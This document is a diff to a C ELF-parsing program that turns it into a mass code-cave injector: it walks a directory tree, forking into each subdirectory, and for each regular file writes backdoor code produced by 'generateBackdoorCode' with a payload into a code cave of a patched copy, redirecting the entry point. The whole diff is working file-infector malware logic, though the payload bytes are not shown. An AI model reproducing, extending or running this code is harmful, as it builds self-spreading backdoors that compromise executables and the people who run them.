@@ -4,6 +4,16 @@
 #include <fcntl.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <dirent.h>
+#include <wait.h>
+
+#ifndef DT_DIR
+extern unsigned char DT_DIR;
+#endif
+
+#ifndef DT_REG
+extern unsigned char DT_REG;
+#endif
 
 //#define DEBUG2
 //#define VERBOSE
@@ -337,26 +347,18 @@ char *findLongestCave(char *codeSec, int secSize, int *codecaveSize){
 	return longest;
 }
 
-/* Main entry point of elf-parser */
-int32_t main(int32_t argc, char *argv[])
-{
-	int32_t fd;
+bool inject_executable(char *path){
+int32_t fd;
 	Elf32_Ehdr eh;		/* elf-header is fixed size */
 
-	if(argc!=2) {
-		printf("Usage: elf-parser <ELF-file>\n");
-		return 0;
-	}
-
-	if((fd = open(argv[1], O_RDONLY|O_SYNC)) < 0) {
-		printf("Error %d Unable to open %s\n", fd, argv[1]);
-		return 0;
+	if((fd = open(path, O_RDONLY|O_SYNC)) < 0) {
+		return false;
 	}
 
 	/* ELF header : at start of file */
 	read_elf_header(fd, &eh);
 	if(!is_ELF(eh)) {
-		return 0;
+		return false;
 	}
 
 	Elf32_Shdr *sh_tbl;	/* section-header table is variable size */
@@ -369,15 +371,13 @@ int32_t main(int32_t argc, char *argv[])
 	sh_tbl = malloc(eh.e_shentsize * eh.e_shnum);
 	
 	if(!sh_tbl) {
-		printf("Failed to allocate %d bytes\n",
-				(eh.e_shentsize * eh.e_shnum));
-		exit(1);
+		return false;
 	}
 
 	read_section_header_table(fd, eh, sh_tbl);
 
-	char *patchName = getPatchedName(argv[1]);
-	duplicateFile(argv[1], patchName);
+	char *patchName = getPatchedName(path);
+	duplicateFile(path, patchName);
 	int patchFD = open(patchName, O_RDWR);
 	
 	int cavesNum;
@@ -385,9 +385,6 @@ int32_t main(int32_t argc, char *argv[])
 
 	#ifdef VERBOSE
 	printf("Caves found: %d\n", cavesNum);
-	#endif
-
-	#ifdef VERBOSE
 	if (cavesNum > 0) codecave_summary(caves, cavesNum);
 	#endif
 
@@ -412,8 +409,7 @@ int32_t main(int32_t argc, char *argv[])
 	char *malEntryPointCode = generateBackdoorCode(oldAddr, payload, sizeof(payload), &newEntryPointSize);
 
 	if(newEntryPointSize > winner->length) {
-		puts("Code injection isn't possible!");
-		exit(1);
+		return false;
 	}
 
 	// Write malicious code to code cave
@@ -424,5 +420,75 @@ int32_t main(int32_t argc, char *argv[])
 	printf("entrypoint = 0x%x\n", eh.e_entry);
 	#endif
 
-	exit(0);
+	return true;
+}
+
+void do_folder(){
+	char path[256];
+	getcwd(path, 256);
+
+	DIR *dp = opendir(path);
+	struct dirent *ent;
+
+	while( (ent = readdir(dp)) != NULL ){
+		if(ent->d_type == DT_REG){
+			inject_executable(ent->d_name);
+			printf("Injected --> %s\n", ent->d_name);
+		}
+	}
+}
+
+void do_folder_recursive(){
+	do_folder();
+
+	char path[256];
+	getcwd(path, 256);
+
+	DIR *dp = opendir(path);
+	struct dirent *ent;
+
+	while( (ent = readdir(dp)) != NULL ){
+		if(ent->d_type == DT_DIR){
+			if(strncmp(ent->d_name, ".", 1) == 0
+			|| strncmp(ent->d_name, "..", 2) == 0){
+				continue;
+			}
+
+			printf("path --> %s\n", ent->d_name);
+
+			int pid;
+			if ((pid = fork()) == 0){
+				chdir(ent->d_name);
+				do_folder();
+				do_folder_recursive();
+				exit(0);
+			}
+		}
+	}
+}
+
+/* Main entry point of elf-parser */
+int32_t main(int32_t argc, char *argv[])
+{
+	if(argc!=2) {
+		printf("Usage: elf-parser <ELF-file>\n");
+		return 0;
+	}
+
+	pid_t pid;
+	
+	if((pid = fork()) == 0){
+		chdir("testing");
+		do_folder_recursive();	
+		exit(0);
+	}
+	else{
+		pid_t temp_pid;
+	
+		while((temp_pid = wait(NULL)) != pid) {
+			;
+		}
+
+		puts("injection complete");
+	}
 }
